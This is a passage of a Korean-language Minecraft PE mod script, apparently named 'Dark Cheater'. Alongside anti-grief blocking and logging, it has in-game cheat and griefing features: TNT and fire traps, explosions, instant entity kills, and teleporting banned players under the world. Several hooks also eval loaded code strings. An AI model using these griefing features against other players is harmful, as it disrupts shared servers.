Dark.toast(Player.getName(pe)+"(이)가 멈춘 물 설치를 시도하였습니다.");
else if(i==325&&it==8)
Dark.toast(Player.getName(pe)+"(이)가 물 양동이 설치를 시도하였습니다.");
}
terrorLog += Player.getName(pe)+" : 물 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 물 설치\n";
}
if(i==10||i==11||(i==325&&it==10)){
if(antiTerror[5]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert){
if(i==10)
Dark.toast(Player.getName(pe)+"(이)가 흐르는 용암 설치를 시도하였습니다.");
else if(i==11)
Dark.toast(Player.getName(pe)+"(이)가 멈춘 용암 설치를 시도하였습니다.");
else if(i==325&&it==10)
Dark.toast(Player.getName(pe)+"(이)가 용암 양동이 설치를 시도하였습니다.");
}
terrorLog += Player.getName(pe)+" : 용암 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 용암 설치\n";
}
if(i==259&&b==46){
if(antiTerror[0]){
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 TNT 점화를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : TNT 점화를 시도\n";
}
else terrorLog += Player.getName(pe)+" : TNT 점화\n";
}
else if(i==51||i==259||i==385){
if(antiTerror[6]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert){
if(i==51) Dark.toast(Player.getName(pe)+"(이)가 불 설치를 시도하였습니다.");
else if(i==259) Dark.toast(Player.getName(pe)+"(이)가 라이터 사용을 시도하였습니다.");
else if(i==385) Dark.toast(Player.getName(pe)+"(이)가 화염구 사용을 시도하였습니다.");
}
terrorLog += Player.getName(pe)+" : 불 설치(또는 라이터/화염구 사용) 시도\n";
}
else terrorLog += Player.getName(pe)+" : 불 설치(또는 라이터/화염구 사용)\n";
}
if(i==46){
if(antiTerror[7]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 TNT 설치를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : TNT 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : TNT 설치\n";
}
if(i==30){
if(antiTerror[8]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 거미줄 설치를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : 거미줄 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 거미줄 설치\n";
}
if(i==7){
if(antiTerror[9]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 베드락 설치를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : 베드락 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 베드락 설치\n";
}
if(i==95){
if(antiTerror[10]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 보이지 않는 베드락 설치를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : 보이지 않는 베드락 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 보이지 않는 베드락 설치\n";
}
if(i==49){
if(antiTerror[11]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 옵시디언 설치를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : 옵시디언 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 옵시디언 설치\n";
}
if(i==246){
if(antiTerror[12]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 빛나는 옵시디언 설치를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : 빛나는 옵시디언 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 빛나는 옵시디언 설치\n";
}
if(i==23){
if(antiTerror[17]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert)
Dark.toast(Player.getName(pe)+"(이)가 발사기 설치를 시도하였습니다.");
terrorLog += Player.getName(pe)+" : 발사기 설치 시도\n";
}
else terrorLog += Player.getName(pe)+" : 발사기 설치\n";
}
}
if(antiTerror[13]&&b==0){
if(terrorAlert){
if(Level.getGameMode()==0) Dark.toast(Player.getName(pe)+"(이)가 광역 파괴를 사용한 것으로 인식되어 추방하고, 드롭된 아이템들을 삭제하였습니다.");
else Dark.toast(Player.getName(pe)+"(이)가 광역 파괴를 한 사용한 것으로 인식되어 추방하였습니다.");
}
terrorLog += Player.getName(pe)+" : 광역 파괴 사용\n";
if(ad!=pe||Player.getName(pe)!=1) Entity.remove(pe);
if(Level.getGameMode()==0){
for each(var e in Entity.getAll()){
if(Entity.getEntityTypeId(e)==64) Entity.remove(e);
}
}
}
if(antiTerror[14]&&i!=0){
Dark.checkEnchant();
}
if(ad==Player.getEntity()||mapTerror2){
switch(mapTerror){
case 1 : 
setTile(x, y, z, 46);
setTile(x+1, y, z, 46);
setTile(x-1, y, z, 46);
setTile(x, y+1, z, 46);
setTile(x, y-1, z, 46);
setTile(x, y, z+1, 46);
setTile(x, y, z-1, 46);
preventDefault();
break;
case 2 : 
setTile(x, y, z, 0);
setTile(x+1, y, z, 0);
setTile(x-1, y, z, 0);
setTile(x, y+1, z, 0);
setTile(x, y-1, z, 0);
setTile(x, y, z+1, 0);
setTile(x, y, z-1, 0);
preventDefault();
break;
case 3 : 
explode(x, y, z, 4);
preventDefault();
break;
case 4 : 
Level.spawnMob(x, y+5, z, 65);
Level.spawnMob(x, y+10, z+3, 65);
Level.spawnMob(x+4, y+7, z, 65);
Level.spawnMob(x, y+15, z-7, 65);
Level.spawnMob(x-9, y+5, z, 65);
Level.spawnMob(x+6, y+17, z+3, 65);
Level.spawnMob(x-8, y+15, z-7, 65);
Level.spawnMob(x-5, y+15, z+5, 65);
Level.spawnMob(x, y+10, z-8, 65);
Level.spawnMob(x-3, y+7, z+1, 65);
Level.spawnMob(x-2, y+14, z+8, 65);
Level.spawnMob(x-7, y+9, z, 65);
Level.spawnMob(x-2, y+13, z-6, 65);
preventDefault();
break;
case 5 : 
for(var xx=x-2;xx<x+3;xx++)
for(var yy=y-2;yy<y+3;yy++)
for(var zz=z-2;zz<z+3;zz++)
if(getTile(xx, yy, zz)==0){
setTile(xx, yy, zz, 51);
}
preventDefault();
break;
case 6 : 
Level.spawnMob(x, y+1, z, 93);
preventDefault();
break;
}
}

if(wo.tf){
var n = wo.user.indexOf(Player.getName(Player.getEntity()));
if(n!=-1){
if(i==267){
wo.x1[n] = x;
wo.y1[n] = y;
wo.z1[n] = z;
setTile(x, y, z, 248);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(500);
setTile(x, y, z, 248);
}
}).start();
preventDefault();
}
else if(i==292){
wo.x2[n] = x;
wo.y2[n] = y;
wo.z2[n] = z;
setTile(x, y, z, 248);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(500);
setTile(x, y, z, 248);
}
}).start();
preventDefault();
}
}
}

if(Ender.portalCheck(x, y, z)){
setTiles(x-6, x+6, y-4, y+5, z-6, z+6, 121);
setTiles(x-5, x+5, y-1, y+4, z-5, z+5, 0);
setTiles(x-5, x+5, y+6, y+8, z-5, z+5, 121);
setTiles(x-4, x+4, y+6, y+8, z-4, z+4, 0);
for(var yy=y+9;yy<y+12;yy++)
setTile(x, yy, z, 49);
setTile(x, y+12, z, 87);
setTile(x, y+13, z, 51);
setTiles(x-1, x+1, y-1, y+1, z-1, z+1, 246);
setTile(x, y, z, 247, 2);
darkMessage("Ender Reactor was Started", true);
en.t = 300;
en.x = x;
en.y = y;
en.z = z;
preventDefault();
}
if(buildingMode){
makeBuilding(x, y, z);
buildingMode = false;
preventDefault();
}
if(makerSummon){
nox = Level.spawnMob(x, y+3, z, 10, "mob/darkTornado.png");
Entity.setRenderType(nox, darkRender.renderType);
Entity.setHealth(nox, 999);
Entity.setNameTag(nox, "§0Dark Tornado");
clientMessage("§e<server> §0Dark Tornado§e joined the Game.");
Entity.setCollisionSize(nox, 0.7, 1.8);
noxT = 300;
makerSummon = false;
noxs.push(nox);
try{
Entity.setMaxHealth(nox, 999);
}
catch(e){
//null;
}
ScriptManager.allentities.remove(nox);
ScriptManager.callScriptMethod("entityRemovedHook", [new java.lang.Long(nox)]);
}
if(h.tf){
h.hero = Level.spawnMob(Player.getX(), Player.getY()+0.5, Player.getZ(), 35, "mob/hero.png");
Entity.setRenderType(h.hero, 3);
Entity.setCollisionSize(h.hero, 0.7, 1.8);
Entity.setHealth(h.hero, 500);
try{
Entity.setMaxHealth(h.hero, 500);
}
catch(e){
//null
}
if(h.l) h.m("안녕, "+Player.getName(Player.getEntity())+".");
else h.m("Hello, "+Player.getName(Player.getEntity())+".");
h.t = 201;
h.tf = false;
}

if(esp.tf&&ad==Player.getEntity()){
eval(Dark.readAddOn("ESP"));
}
if(sm.tf&&i==261){
sm.x = x;
sm.y = y;
sm.z = z;
Dark.toast("기준점 선택("+x+", "+y+", "+z+")");
preventDefault();
}
if(Level.getGameMode()==0&&tooMany&&i<256)
addItemInventory(i, 1, it);
if(i<256&&blockLog)
blockString += "<"+Player.getName(Player.getEntity())+"> "+i+", "+it+"\n";
if(findOre){
var ores = [0, 0, 0, 0, 0, 0, 0, 0];
for(var yy=0;yy<y+1;yy++){
var bb = getTile(x, yy, z);
if(bb==14) ores[0]++;
else if(bb==15) ores[1]++;
else if(bb==16) ores[2]++;
else if(bb==21) ores[3]++;
else if(bb==56) ores[4]++;
else if(bb==73||bb==74) ores[5]++;
else if(bb==129) ores[6]++;
else if(bb==153) ores[7]++;
}
Dark.showDialog("광물 목록", "금 : "+ores[0]+"\n철 : "+ores[1]+"\n석탄 : "+ores[2]+"\n청금석 : "+ores[3]+"\n다이아몬드 : "+ores[4]+"\n레드스톤 : "+ores[5]+"\n에메랄드 : "+ores[6]+"\n네더 석영 : "+ores[7]+"\n");
preventDefault();
}
if(editChest&&b==54){
openChest(x, y, z);
preventDefault();
}
if(signTp&&(b==63||b==68)&&Level.getSignText(x, y, z, 0)=="tp"){
teleport(Player.getEntity(), Level.getSignText(x, y, z, 1), Level.getSignText(x, y, z, 2), Level.getSignText(x, y, z, 3));
if(tpAlert){
darkMessage(Player.getName(Player.getEntity())+"(이)가 X : "+Level.getSignText(x, y, z, 1)+", Y : "+Level.getSignText(x, y, z, 2)+", Z : "+Level.getSignText(x, y, z, 3)+"(으)로 이동하였습니다.", true);
}
}
if(est!=0){
switch(est){
case 1 : 
for(var n=0;n<esn;n++){
var uuu = Level.spawnMob(x, y+1, z, 93);
var ooo = Level.spawnMob(x, y+1, z, 33);
Entity.rideAnimal(uuu, ooo);
}
break;
case 2 : 
for(var n=0;n<esn;n++){
var eee = Level.spawnMob(x, y+3, z, 32);
ScriptManager.nativeZombieSetBaby(eee, true);
}
break;
case 3 : 
for(var n=0;n<esn;n++){
var eee = Level.spawnMob(x, y+3, z, 36);
ScriptManager.nativeZombieSetBaby(eee, true);
}
break;
case 4 : 
for(var n=0;n<esn;n++){
var uuu = Level.spawnMob(x, y+1, z, 35);
var ooo = Level.spawnMob(x, y+1, z, 34);
Entity.rideAnimal(ooo, uuu);
}
break;
case 5 : 
for(var n=0;n<esn;n++){
var uuu = Level.spawnMob(x, y+1, z, 10);
var ooo = Level.spawnMob(x, y+1, z, 32);
ScriptManager.nativeZombieSetBaby(ooo, true);
Entity.rideAnimal(ooo, uuu);
}
break;
}
est = 0;
}
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(Player.getEntity())+"(이)가 블록 터치 (아이템 : "+i+", "+Player.getCarriedItemData()+" 블록 : "+b+", "+bd+", 위치 : "+x+", "+y+", "+z+")\n";
if(antiBlock&&(i<256||(i==325&&it==8)||(i==325&&it==10)||[259, 354, 324, 427, 428, 429, 430, 431, 330, 331, 355, 397, 379, 338, 390, 323].indexOf(i)!=-1||([295, 361, 362, 391, 392, 458].indexOf(i)!=-1&&b==60))){
Dark.removeBlock(x, y, z, s);
}
if(i==511&&mobBattle){
if(mobBattleAttacker==null){
mobBattleAttacker = Player.getEntity();
Dark.toast("공격받을 엔티티를 터치하세요...");
}
else{
Entity.setTarget(mobBattleAttacker, Player.getEntity());
mobBattle = false;
mobBattleAttacker = null;
Dark.toast("싸움이 시작됩니다.");
}
preventDefault();
}
if(i<256&&mfmf[0]){
for(var xx=x-2;xx<x+3;xx++)
for(var yy=y-3;yy<y+4;yy++)
for(var zz=z-2;zz<z+3;zz++)
if(getTile(xx, yy, zz)==0){
setTile(xx, yy, zz, i, it);
}
}
if(getPlayers) playerAddedHandler(Player.getEntity());
if(compileFinish){
var itemId = i, blockId = b, side = s, itemDamage = it, blockDamage= bd;
eval(dcmsData.useItem+"");
}
var code = eval(code);
if(mineSet==1){
mineSet = 2;
mineData[0] = [x, y, z];
Dark.toast("지점 2을 터치하세요...");
}
else if(mineSet==2){
mineSet = 0;
mineData[1] = [x, y, z];

Dark.toast("광산의 종류를 선택하세요...");
selectMineType(true);
}
eval(astel.ui+"");
if(spawn==1){
spawnPos = [x, y, z];
showParticle(x, y, z);
Dark.toast("마을이 생성되는 영역은 다음과 같습니다.\n한 번 더 터치하시면 생성되며, \"NPC 마을 생성\" 버튼을 길게 눌러서 생성을 멈출 수 있습니다.");
spawn = 2;
}
else if(spawn==2){
spawnVillage(spawnPos[0], spawnPos[1], spawnPos[2]);
Dark.toast("마을이 생성되었습니다.");
spawn = 0;
}

}


function attackHook(a, v){
if(noPvp&&Player.isPlayer(a)&&Player.isPlayer(v)) preventDefault();
if(a==ad){
if(darkType==4){
Entity.rideAnimal(a, v);
preventDefault();
}
if(darkType==5){
Entity.setHealth(v, 0);
preventDefault();
}
if(rideEnt){
Entity.rideAnimal(a, v);
preventDefault();
rideEnt = false;
}
if(killEnt){
Entity.setHealth(v, 0);
preventDefault();
}
if(showEntHealth){
showEntHealthTarget = v;
}

}

if(getCarriedItem()==266){
if(a==dl.esp[5]&&dl.c[5]==0){
Entity.setVelX(v, 3*(Entity.getX(v)-Player.getX()));
Entity.setVelZ(v, 3*(Entity.getZ(v)-Player.getZ()));
preventDefault();
dl.c[5] = 450;
}
if(a==dl.esp[7]&&dl.c[7]==0){
Entity.setHealth(v, Entity.getHealth(v)-6);
Entity.setHealth(a, Entity.getHealth(a)+6);
preventDefault();
dl.c[7] = 450;
}

}
if(antiTerror[2]&&(adTer||(!adTer&&ad!=a))){
preventDefault();
if(terrorAlert)
Dark.toast(Player.getName(a)+"(이)가 누군가를 공격하였습니다.");
terrorLog += Player.getName(a)+" : PVE 시도\n";
}
terrorLog += Player.getName(a)+" : PVE\n";
if(entName!=""&&a==ad){
Entity.setNameTag(v, entName);
entName = "";
preventDefault();
}

if(v==nox){
dtm("때리지 마시게나...");
preventDefault();
}

if(v==h.hero){
var rrr = Math.floor(Math.random()*5);
if(rrr==0){
if(h.l) h.m("공격반사!");
else h.m("Reflaction!");
Entity.setHealth(a, Entity.getHealth(a)-4);
preventDefault();
}
else if(rrr==1){
if(h.l) h.m("뒤로 물러나라!");
else h.m("Go Back!");
Entity.setVelX(a, 1.5*(Entity.getX(a)-Entity.getX(v)));
Entity.setVelZ(a, 1.5*(Entity.getZ(a)-Entity.getZ(v)));
}
}
if(gh[2]){
Entity.setVelX(v, 3*(Entity.getX(v)-Player.getX()));
Entity.setVelZ(v, 3*(Entity.getZ(v)-Player.getZ()));
preventDefault();
}
if(hyperLogOn){
if(Player.isPlayer(v)) hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(a)+"(이)가 "+Player.getName(v)+"(을)를 때림 (사용한 아이템 : "+getCarriedItem()+", "+Player.getCarriedItemData()+")\n";
else hyperLog += "["+Dark.getTime(2)+"] "+Player.getName(a)+"(이)가 "+Entity.getEntityTypeId(v)+"번 엔티티를 때림 (사용한 아이템 : "+getCarriedItem()+", "+Player.getCarriedItemData()+")\n";
}
if(mobBattle){
if(mobBattleAttacker==null){
mobBattleAttacker = v;
Dark.toast("공격받을 엔티티를 터치하세요...");
}
else{
Entity.setTarget(mobBattleAttacker, v);
mobBattle = false;
mobBattleAttacker = null;
Dark.toast("싸움이 시작됩니다.");
}
preventDefault();
}
if(antiTerror[14]&&getCarriedItem()!=0){
Dark.checkEnchant();
}
if(getPlayers){
playerAddedHandler(a);
playerAddedHandler(v);
}
if(compileFinish){
var attacker = a, victim = v;
eval(dcmsData.attackHook+"");
}
eval(astel.ah+"");


}


function modTick(){
if(dt>0){
dt--;
}
if(dt==1){
ad = Player.getEntity();
}
if(banList[0]!=null){
for(var n in banList)
teleport(banList[n], Entity.getX(ad), -5, Entity.getZ(ad));
}
if(p.p!=null){
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
var ss, c;
ss = -Math.sin(Math.floor(getYaw())/180*Math.PI);
c = Math.cos(Math.floor(getYaw())/180*Math.PI);
if(Math.abs(ss)>Math.abs(c)){
if(ss>=0) p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : X+");
else p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : X-");
}
else if(Math.abs(ss)<Math.abs(c)){
if(c>=0) p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : Z+");
else p.t.setText(" X : "+Math.round(Player.getX()-0.5)+", Y : "+Math.floor(Player.getY())+"\n Z : "+Math.round(Player.getZ()-0.5)+", S : Z-");
}
}
}));
}
if(rt>0){
rt--;
}
if(run){
if(rt==2){
rx = Player.getX();
rz = Player.getZ();
}
else if(rt==1){
var pe = Player.getEntity();
Entity.setVelX(pe, Player.getX()-rx);
Entity.setVelZ(pe, Player.getZ()-rz);
rt = 3;
}
}
if(light){
lx = l.x;
ly = l.y;
lz = l.z;
l.x = Math.round(Player.getX()-0.5);
if(mcpev2) l.y = Math.floor(Player.getY(ad))-1;
else l.y = Math.floor(Player.getY());
l.z = Math.round(Player.getZ()-0.5);
if(l.x!=lx||l.y!=ly||l.z!=lz){
setTile(lx, ly, lz, l.b[0], l.b[1]);
l.b = [getTile(l.x, l.y, l.z), Level.getData(l.x, l.y, l.z)];
setTile(l.x, l.y, l.z, 230);
}
}
if(clock!=null){
var ap, hour, min, sec;
var day = new Date();
hour = day.getHours();
min = day.getMinutes();
sec = day.getSeconds();
if(hour>12){
hour -=12;
ap = " 오후 ";
}
else
ap = " 오전 ";
if(min<10)
min = "0"+min;
if(sec<10)
sec = "0"+sec;
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
clockText.setText(ap+hour+"시 "+min+"분 "+sec+"초");
}
}));
}
if(walk){
var pe = Player.getEntity();
var wsin, wcos;
wsin = -Math.sin(Math.floor(getYaw())/180*Math.PI);
wcos = Math.cos(Math.floor(getYaw())/180*Math.PI);
if(run){
Entity.setVelX(pe, wsin/2);
Entity.setVelZ(pe, wcos/2);
}
else{
Entity.setVelX(pe, wsin/4);
Entity.setVelZ(pe, wcos/4);
}
}
if(climbing){
var p2x, p2y, p2z;
p2x = Player.getX();
p2y = Player.getY()-1.2;
p2z = Player.getZ();
for(var xx=p2x-1;xx<p2x+2;xx++)
for(var zz=p2z-1;zz<p2z+2;zz++)
if(getTile(xx, p2y, zz)!=0){
Entity.setVelY(Player.getEntity(), 0.1);
}
}
if(j.on){
var pe = Player.getEntity();
if(j.m==1)
Entity.setVelY(pe, 0.00001);
else if(j.m==2){
j.y = Math.floor(Entity.getYaw(ad));
j.p = Math.floor(Entity.getPitch(ad));
j.s = -Math.sin(j.y/180*Math.PI);
j.c = Math.cos(j.y/180*Math.PI);
j.t = -Math.sin(j.p/180*Math.PI);
j.pc = Math.cos(j.p/180*Math.PI);
if(run) j.n = 2;
else j.n = 1;
if(j.f==0){
Entity.setVelX(pe, j.n*j.s*j.pc);
Entity.setVelY(pe, j.n*j.t);
Entity.setVelZ(pe, j.n*j.c*j.pc);
}
else if(j.f==1){
Entity.setVelX(pe, -j.n*j.s*j.pc);
Entity.setVelY(pe, -j.n*j.t);
Entity.setVelZ(pe, -j.n*j.c*j.pc);
}
}
}

for(var n in espNames){
if(dl.c[n]>0)
dl.c[n]--;
}
if(dl.c[3]==405){
anti = 15;
explode(dl.sx+0.5, dl.sy+1.5, dl.sz+0.5, 3);
}
if(dl.c[8]==445||dl.c[9]==445){
anti = 15;
for(var gun=3;gun<30;gun++){
setTile(px+gun*sin, py+2, pz+gun*cos, 0);
explode(px+gun*sin, py+2, pz+gun*cos, 1.7);
}
}

if(auto){
if(dl.c[1]==150)
setTiles(dl.wx-2, dl.wx+2, dl.wy, dl.wy, dl.wz-2, dl.wz+2, 2);
if(dl.c[3]==1)
setTiles(dl.ex-5, dl.ex+5, dl.ey, dl.ey, dl.ez-5, dl.ez+5, 2);
if(dl.c[3]==31)
setTiles(dl.ex-5, dl.ex+5, dl.ey-1, dl.ey-1, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==61)
setTiles(dl.ex-5, dl.ex+5, dl.ey-2, dl.ey-2, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==91)
setTiles(dl.ex-5, dl.ex+5, dl.ey-3, dl.ey-3, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==121)
setTiles(dl.ex-5, dl.ex+5, dl.ey-4, dl.ey-4, dl.ez-5, dl.ez+5, 3);
if(dl.c[3]==151)
setTiles(dl.ex-5, dl.ex+5, dl.ey-5, dl.ey-5, dl.ez-5, dl.ez+5, 3);
if(dl.c[1]==1)
setTiles(dl.sx-1, dl.sx+1, dl.sy+1, dl.sy+3, dl.sz-1, dl.sz+1, 0);
if(dl.c[1]==31)
setTiles(dl.sx-5, dl.sx+5, dl.sy, dl.sy, dl.sz-5, dl.sz+5, 2);
if(dl.c[1]==61)
setTiles(dl.sx-5, dl.sx+5, dl.sy-1, dl.sy-1, dl.sz-5, dl.sz+5, 3);
if(dl.c[1]==91)
setTiles(dl.sx-5, dl.sx+5, dl.sy-2, dl.sy-2, dl.sz-5, dl.sz+5, 3);
if(dl.c[1]==121)
setTiles(dl.sx-5, dl.sx+5, dl.sy-3, dl.sy-3, dl.sz-5, dl.sz+5, 3);
if(dl.c[1]==151)
setTiles(dl.sx-5, dl.sx+5, dl.sy-4, dl.sy-4, dl.sz-5, dl.sz+5, 3);
}

if(anti>0){
anti--;
}
if(darkCheaterActive){
darkCheaterActive = false;
}
var pe = Player.getEntity();
if(s.run)
Entity.addEffect(pe, MobEffect.movementSpeed, 20, 1, false, false);
if(s.walk){
s.sin = -Math.sin(Math.floor(getYaw())/180*Math.PI);
s.cos = Math.cos(Math.floor(getYaw())/180*Math.PI);
Entity.setVelX(pe, s.sin/4);
Entity.setVelZ(pe, s.cos/4);
}
if(s.move==1){
s.x = Math.round(Player.getX()-0.5);
s.y = Player.getY()-0.5;
s.z = Math.round(Player.getZ()-0.5);
for(var xx=s.x-1;xx<s.x+2;xx++)
for(var zz=s.z-1;zz<s.z+2;zz++)
if(getTile(xx, s.y, zz)!=0){
Entity.setVelY(pe, 0.1);
break;
}
}
if(s.move==2){
s.x = Math.round(Player.getX()-0.5);
s.y = Player.getY()+1;
s.z = Math.round(Player.getZ()-0.5);
for(var xx=s.x-1;xx<s.x+2;xx++)
for(var zz=s.z-1;zz<s.z+2;zz++)
if(getTile(xx, s.y, zz)!=0){
Entity.setVelY(pe, 0.00001);
break;
}
}

if(en.t>0){
en.t--;
}
if(en.t==255){
Level.spawnMob(en.x+4, en.y+2, en.z+4, 38);
Level.spawnMob(en.x-4, en.y+2, en.z-4, 38);
Level.dropItem(en.x+4, en.y, en.z, 2, 264, 1, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 264, 1, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 264, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 264, 1, 0);
}
if(en.t==180){
Level.dropItem(en.x+4, en.y, en.z, 2, 261, 1, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 262, 7, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 278, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 5, 6, 0);
}
if(en.t==105){
Level.spawnMob(en.x-4, en.y+2, en.z+4, 38);
Level.spawnMob(en.x-4, en.y+2, en.z-4, 38);
Level.dropItem(en.x+4, en.y, en.z, 2, 330, 1, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 328, 1, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 265, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 264, 3, 0);
}
if(en.t==30){
Level.spawnMob(en.x-4, en.y+2, en.z-4, 38);
Level.dropItem(en.x+4, en.y, en.z, 2, 46, 3, 0);
Level.dropItem(en.x-4, en.y, en.z, 2, 259, 1, 0);
Level.dropItem(en.x, en.y, en.z+4, 2, 264, 1, 0);
Level.dropItem(en.x, en.y, en.z-4, 2, 406, 1, 0);
}
if(en.t==1){
for(var xx=en.x-1;xx<en.x+2;xx++)
for(var yy=en.y-1;yy<en.y+2;yy++)
for(var zz=en.z-1;zz<en.z+2;zz++)
setTile(xx, yy, zz, 49);
setTile(en.x, en.y, en.z, 247);
setTile(en.x+6, en.y, en.z, 0);
setTile(en.x+6, en.y-1, en.z, 0);
setTile(en.x-6, en.y, en.z, 0);
setTile(en.x-6, en.y-1, en.z, 0);
setTile(en.x, en.y, en.z+6, 0);
setTile(en.x, en.y-1, en.z+6, 0);
setTile(en.x, en.y, en.z-6, 0);
setTile(en.x, en.y-1, en.z-6, 0);
}
if(noxT>0){
noxT--;
Entity.setHealth(nox, 999);
Entity.setNameTag(nox, "§0Dark Tornado");
}
if(Entity.getHealth(nox)<=0){
noxT = 0;
}
if(noxT==202){
dtm("나를 부른 이유가 무엇인가...");
}
if(noxT==1){
var rrr = Math.floor(Math.random()*9);
if(rrr==0) dtm("심심하구만...");
if(rrr==1) dtm("안녕하신가, "+ModPE.getUserName()+".");
if(rrr==2) particleShot();
if(rrr==3) dtm("이 스크립트를 무단공유하면 작동을 차단할걸세.");
if(rrr==4) dtm("Dark Cheater "+version+"은 잘 사용하고 있는가?");
if(rrr==5) pushMaker();
if(rrr==6) dtm("이 스크립트는 테러용 스크립트가 아니라네...");
if(rrr==7) Entity.setVelY(nox, 1.3);
if(rrr==8) giveDiamonds();
if(rrr==9) dtm("대화를 하고 싶다면 Nusty를 사용하게나...");
noxT = 201;
}
if(anT>0){
anT--;
}
if(anT<0){
anT++;
}
if(w.tf){
if(getCarriedItem()<256){
if(w.f) setTile(Math.round(Player.getX()-0.5), Player.getY()-2, Math.round(Player.getZ()-0.5), getCarriedItem(), Player.getCarriedItemData());
if(w.h) setTile(Math.round(Player.getX()-0.5), Player.getY()+1, Math.round(Player.getZ()+0.5), getCarriedItem(), Player.getCarriedItemData());
}
}
if(mc){
mx = Math.round(Player.getX()-0.5);
if(getPitch()==90||mc2) my = Player.getY()-3;
else my = Player.getY()-2;
mz = Math.round(Player.getZ()-0.5);
for(var xx=mx-2;xx<mx+3;xx++){
for(var zz=mz-2;zz<mz+3;zz++){
if(getTile(xx, my+1, zz)==20){
setTile(xx, my+1, zz, 0);
}
if(getTile(xx, my-1, zz)==20){
setTile(xx, my-1, zz, 0);
}
if(getTile(xx, my, mz+2)==20){
setTile(xx, my, mz+2, 0);
}
if(getTile(xx, my, mz-2)==20){
setTile(xx, my, mz-2, 0);
}
}}
for(var zz=mz-1;zz<mz+2;zz++){
if(getTile(mx+2, my, zz)==20){
setTile(mx+2, my, zz, 0);
}
if(getTile(mx-2, my, zz)==20){
setTile(mx-2, my, zz, 0);
}
for(var xx=mx-1;xx<mx+2;xx++)
if(getTile(xx, my, zz)==0){
setTile(xx, my, zz, 20);
}
}
}
if(mt>0){
mt--;
}
if(mt==-1){
mx = Player.getX();
my = Player.getY()-4;
mz = Player.getZ();
if(getTile(mx, my-1, mz)!=0){
for(var xx=mx-1;xx<mx+2;xx++)
for(var zz=mz-1;zz<mz+2;zz++)
if(getTile(xx, my+1, zz)==0){
setTile(xx, my+1, zz, 30);
}
mt = 16;
}
}
if(mt==1){
for(var xx=mx-1;xx<mx+2;xx++)
for(var zz=mz-1;zz<mz+2;zz++)
if(getTile(xx, my+1, zz)==30){
setTile(xx, my+1, zz, 0);
}
}
if(nf.tf){
var pe = Player.getEntity();
nf.x = Player.getX();
nf.y = Player.getY();
nf.z = Player.getZ();
nf.v = Entity.getVelY(pe);
if(((nf.v<-0.5&&getTile(nf.x, nf.y-3, nf.z)!=0)||(nf.v<-1&&getTile(nf.x, nf.y-5, nf.z)!=0))&&nf.t==0){
nf.s = Level.spawnMob(nf.x, nf.y-1, nf.z, 10);
Entity.rideAnimal(pe, nf.s);
Entity.setVelY(nf.s, nf.v);
ModPE.showTipMessage("");
nf.t = 3;
}
if(nf.t>0){
nf.t--;
}
if(nf.t==1){
Entity.remove(nf.s);
Entity.setVelY(pe, nf.v);
nf.t = 0;
}
}

if(h.t>0){
h.t--;
Entity.setFireTicks(h.hero, 0);
if(h.l) ModPE.showTipMessage("\n\n\n히로빈 : "+Entity.getHealth(h.hero)+"/500");
else ModPE.showTipMessage("\n\n\nHerobrine : "+Entity.getHealth(h.hero)+"/500");
if(Entity.getHealth(h.hero)<=0){
h.x = Entity.getX(h.hero);
h.y = Entity.getY(h.hero)+1;
h.z = Entity.getZ(h.hero);
Level.dropItem(h.x, h.y, h.z, 1, 264, 31, 0);
Level.dropItem(h.x, h.y, h.z, 1, 46, 53, 0);
Level.dropItem(h.x, h.y, h.z, 1, 259, 1, 36);
Level.dropItem(h.x, h.y, h.z, 1, 259, 1, 0);
Level.dropItem(h.x, h.y, h.z, 1, 262, 12, 0);
